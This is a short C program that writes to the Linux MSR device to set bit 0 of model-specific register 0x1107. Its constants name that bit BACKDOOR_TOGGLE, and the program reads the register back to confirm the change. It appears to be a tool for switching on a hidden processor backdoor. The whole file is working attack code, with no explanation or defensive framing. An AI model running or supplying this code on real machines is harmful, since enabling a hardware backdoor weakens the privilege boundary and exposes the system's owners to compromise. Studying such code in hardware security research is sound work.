#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>

#define BACKDOOR_MSR     0x00001107
#define BACKDOOR_TOGGLE  0x00000001

#define MSR_DEV "/dev/cpu/0/msr"

int main(void)
{
	FILE* f;
	uint64_t v;

	f=fopen(MSR_DEV, "rb+");
	
	if (f==NULL) {
		printf("! failed to open %s\n", MSR_DEV);
		exit(-1);
	}

	fseek(f, BACKDOOR_MSR, SEEK_SET);
	fread(&v, 8, 1, f);
	printf("read.... %08llx\n", v);

	v|=BACKDOOR_TOGGLE;

	fseek(f, BACKDOOR_MSR, SEEK_SET);
	fwrite(&v, 8, 1, f);
	printf("wrote... %08llx\n", v);

	fseek(f, BACKDOOR_MSR, SEEK_SET);
	fread(&v, 8, 1, f);
	printf("read.... %08llx\n", v);

	fclose(f);

	return 0;
}
